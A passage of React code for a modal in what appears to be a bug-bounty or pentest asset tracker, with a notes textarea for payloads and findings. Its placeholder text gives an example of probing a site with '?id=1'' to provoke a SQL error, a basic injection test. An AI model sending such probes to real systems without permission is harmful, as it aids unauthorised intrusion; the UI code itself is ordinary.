            background: "var(--color-bg)", width: "600px", maxWidth: "90%", borderRadius: "12px", overflow: "hidden", border: "1px solid var(--color-border)", display: "flex", flexDirection: "column"
          }}>
            <div style={{ padding: "16px 24px", borderBottom: "1px solid var(--color-border)", display: "flex", justifyContent: "space-between", alignItems: "center", background: "var(--color-bg-secondary)" }}>
              <div>
                <h3 style={{ margin: "0 0 4px 0", fontSize: "18px" }}>{activeAsset.name}</h3>
                <span style={{ fontSize: "12px", background: "var(--color-blue)", color: "white", padding: "2px 8px", borderRadius: "12px" }}>
                  Current Phase: {activeAsset.column}
                </span>
              </div>
              <button onClick={() => setActiveAsset(null)} style={{ background: "none", border: "none", fontSize: "24px", cursor: "pointer", color: "var(--color-text-muted)" }}>×</button>
            </div>
            
            <div style={{ padding: "24px", display: "flex", flexDirection: "column", gap: "16px" }}>
              <div>
                <label style={{ display: "block", fontSize: "14px", fontWeight: 600, marginBottom: "8px", color: "var(--color-text)" }}>
                  Asset Notepad (Payloads, findings, weird behaviors)
                </label>
                <textarea 
                  className="vault-input"
                  style={{ width: "100%", height: "250px", padding: "12px", fontFamily: "monospace", fontSize: "13px" }}
                  value={activeAsset.notes}
                  onChange={(e) => updateAssetNotes(activeAsset.id, e.target.value)}
                  placeholder="e.g., Found 3 hidden parameters using Arjun: ?id=, ?debug=, ?role=\n\nTested ?id=1' and got a SQL error. Digging deeper..."
                />
              </div>
            </div>
            
            <div style={{ padding: "16px 24px", borderTop: "1px solid var(--color-border)", display: "flex", justifyContent: "flex-end", background: "var(--color-bg-secondary)" }}>
              <button className="btn-primary" onClick={() => setActiveAsset(null)}>Done</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
